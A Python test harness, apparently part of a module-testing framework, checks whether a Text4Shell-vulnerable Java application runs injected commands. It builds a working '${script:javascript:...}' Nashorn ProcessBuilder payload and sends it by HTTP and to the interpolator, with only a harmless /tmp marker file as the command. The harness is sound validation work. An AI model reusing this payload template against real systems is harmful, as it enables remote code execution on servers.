"""Pinned application, real Nashorn/interpolator, and exact CLI/HTTP controls."""
from pathlib import Path
import base64
import datetime
import hashlib
import http.client
import importlib.util
import json
import os
import re
import sys
import urllib.parse

spec = importlib.util.spec_from_file_location('text4shell_native_base', 'test/module_targets/dizquetv/native_probe.py')
base = importlib.util.module_from_spec(spec)
spec.loader.exec_module(base)


class Native(base.Native):
    def request(self, method, expression, parameter='search'):
        endpoint = self.runtime['endpoints']['target']
        client = http.client.HTTPConnection(endpoint['host'], endpoint['port'], timeout=15)
        encoded = urllib.parse.urlencode({parameter: expression}).encode()
        path = '/text4shell/attack'
        body, headers = None, {}
        if method == 'GET':
            path += '?' + encoded.decode()
        else:
            body, headers = encoded, {'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            client.request(method, path, body=body, headers=headers)
            response = client.getresponse()
            result = dict(status=response.status, body_base64=base64.b64encode(response.read()).decode())
            self.journal['http'].append(dict(method=method, path=path, body_base64=None if body is None else base64.b64encode(body).decode(), response=result))
            self.save()
            return result
        finally:
            client.close()

    def java(self, mode, value=''):
        encoded = base64.b64encode(value.encode()).decode()
        return json.loads(self.command('native-java-'+mode, 'java', '-Xmx64m', '-Dloader.main=NativeControl', '-cp', '/opt/text4shell.jar', 'org.springframework.boot.loader.PropertiesLauncher', mode, encoded))

    def file(self, path, remove=False):
        assert re.fullmatch(r'/tmp/module-target-text4shell-[a-z0-9_-]+', path), path
        if remove:
            self.command('remove-proof', 'rm', '-f', '--', path)
        code = 'if [ -f "$1" ]; then stat -c %u "$1"; base64 -w0 "$1"; else printf absent; fi'
        raw = self.command('physical-proof', 'sh', '-c', code, 'native-proof', path)
        if raw == b'absent':
            return dict(exists=False)
        uid, content = raw.split(b'\n', 1)
        base64.b64decode(content, validate=True)
        return dict(exists=True, uid=int(uid), base64=content.decode())

    def snapshot(self):
        paths = ['/opt/text4shell.jar', '/opt/vendor/controller.java', '/opt/vendor/pom.xml', '/opt/module-target-state/foreign']
        return dict(files=self.command('preservation', 'sha256sum', *paths).decode().splitlines(), uid=int(self.command('uid', 'id', '-u')))

    def control(self, command, path, expected, vulnerable, method):
        physical = dict(exists=True, uid=1000, base64=base64.b64encode(expected).decode())
        assert self.file(path) == dict(exists=False)
        # A separate native ProcessBuilder path waits for completion; it does
        # not reuse the module's Runtime.exec expression or parameter builder.
        expression = "new java.lang.ProcessBuilder(Java.to(['/bin/sh','-c',new java.lang.String(java.util.Base64.getDecoder().decode('"+base64.b64encode(command.encode()).decode()+"'),'UTF-8')],'java.lang.String[]')).start().waitFor()"
        result = dict(command_base64=base64.b64encode(command.encode()).decode(), method=method, expression=expression)
        before = self.snapshot()
        try:
            self.command('same-command-cli', 'sh', '-c', command)
            assert self.file(path) == physical
            self.file(path, True)
            result['engine'] = self.java('engine', expression)
            assert result['engine']['ok'] and self.file(path) == physical
            self.file(path, True)
            interpolation = '${script:javascript:'+expression+'}'
            result['interpolator'] = self.java('interpolate', interpolation)
            assert result['interpolator']['ok']
            # The fixed library leaves the disabled lookup literal; it does
            # not have to raise an exception to prevent execution.
            assert result['interpolator']['value'] == ('0' if vulnerable else interpolation)
            assert self.file(path) == (physical if vulnerable else dict(exists=False))
            self.file(path, True)
            result['http'] = self.request(method, '${script:javascript:'+expression+'}')
            assert result['http']['status'] == 200
            result['physical'] = self.file(path)
            assert result['physical'] == (physical if vulnerable else dict(exists=False))
            result['passed'] = True
            return result
        finally:
            assert self.file(path, True) == dict(exists=False)
            assert self.snapshot() == before


def main():
    runtime = json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text())
    action, *args = sys.argv[1:]
    out = Path(runtime['artifacts'])/('text4shell-native-'+action+'-'+datetime.datetime.now(datetime.timezone.utc).strftime('%Y%m%dT%H%M%S%f'))
    native = Native(runtime, out)
    version, method = os.environ['TEXT4SHELL_VERSION'], os.environ['TEXT4SHELL_METHOD']
    state = dict(module_invoked=False, version=version, method=method)
    try:
        if action == 'before':
            vendor = json.loads(Path('test/module_targets/text4shell/vendor.json').read_text())
            state['metadata'] = native.java('metadata')
            assert state['metadata']['ok'] and state['metadata']['text_version'] == version
            assert state['metadata']['java_version'].startswith('1.8.') and state['metadata']['script_engine'] == 'Oracle Nashorn'
            original = native.command('original-controller', 'sha256sum', '/opt/vendor/original-controller.java').decode().split()[0]
            actual = native.command('active-controller', 'sha256sum', '/opt/vendor/controller.java').decode().split()[0]
            assert original == vendor['controller_sha256'] and actual == vendor['post_controller_sha256' if method == 'POST' else 'controller_sha256']
            state['controller_sha256'] = actual
            literal = native.request(method, 'native & quoted 雪')
            assert literal['status'] == 200 and base64.b64decode(literal['body_base64']).decode() == 'Search results for: native & quoted 雪'
            if method == 'GET':
                state['post_not_supported'] = native.request('POST', 'native')
                assert state['post_not_supported']['status'] == 405
            native.command('foreign-preservation-fixture', 'sh', '-c', 'cat > /opt/module-target-state/foreign', stdin='foreign & quoted 雪\n'.encode())
            state['baseline'] = native.snapshot()
            assert state['baseline']['uid'] == 1000
            state['controls'] = []
            for label, marker in [('plain', b'text4shell plain\n'), ('rich', 'apostrophe\' double" $dollar `tick` \\ slash & 雪\r\nnext\n'.encode())]:
                path = '/tmp/module-target-text4shell-native-'+label
                command = "printf %s '"+marker.decode().replace("'", "'\"'\"'")+"' > "+path
                proof = native.control(command, path, marker, version == '1.8', method)
                state['controls'].append(dict(label=label,path=path,command=command,marker_base64=base64.b64encode(marker).decode(),control=proof))
            state['after'] = native.snapshot()
            assert state['after'] == state['baseline']
            state['passed'] = True
        elif action == 'file':
            state = native.file(args[0], len(args) > 1 and args[1] == 'remove')
        elif action == 'snapshot':
            state = native.snapshot()
        else:
            raise ValueError('Unknown native action')
    finally:
        native.journal['result'] = state
        native.save()
    print(json.dumps(state))


if __name__ == '__main__':
    main()
